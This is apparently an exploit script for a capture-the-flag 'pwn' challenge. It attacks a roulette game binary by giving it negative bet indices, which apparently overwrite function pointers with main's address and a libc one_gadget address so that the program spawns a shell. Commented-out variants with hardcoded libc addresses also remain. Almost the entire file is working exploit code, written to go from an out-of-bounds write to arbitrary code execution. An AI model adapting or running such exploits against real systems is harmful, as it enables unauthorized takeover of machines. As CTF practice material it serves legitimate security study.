#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc


def game(idx, data):
    ru(b"Enter the number (0-36) you think the roulette will land on: \n")
    sl(i2b(idx))
    ru(b"Enter the amount you want to wager: \n")
    sl(i2b(data))


main_addr = 0x808A281

# game(-0x16, (elf.sym["main"]) - 0x401060)
# game(-0x15, (0x7FFFF7E36C90) - 0x7FFFF7E59CE0)

# game(-0x17, (0x7FFFF7DD5000 + 0xE3B01) - (0x401050))
# game(-0x18, (elf.sym["main"]) * 2 - 0x401040)

game(-0x16, (main_addr) - 0x401060)
game(-0x19, (0x7FFFF7DD5000 + 0xE3B01) - 0x7FFFF7E59420)

# game(-0x18, (elf.sym["main"]) * 2 - 0x401040)
# game(-0x17, (elf.sym["main"]) - 0x401050)
# game(-0x19, (0x7FFFF7DD5000 + 0xE3B01) - 0x7FFFF7E59420)

# game(-0x15, (0x7FFFF7E27290) * 2 - 0x7FFFF7E59CE0)
# game(-2, (u64_ex(b"sh;\x00")) * 2 - 0x7FFFF7FC26A0)


# game(-0x17, (0x7FFFF7DD5000 + 0xE3B01) - ((elf.sym["main"])))


ia()
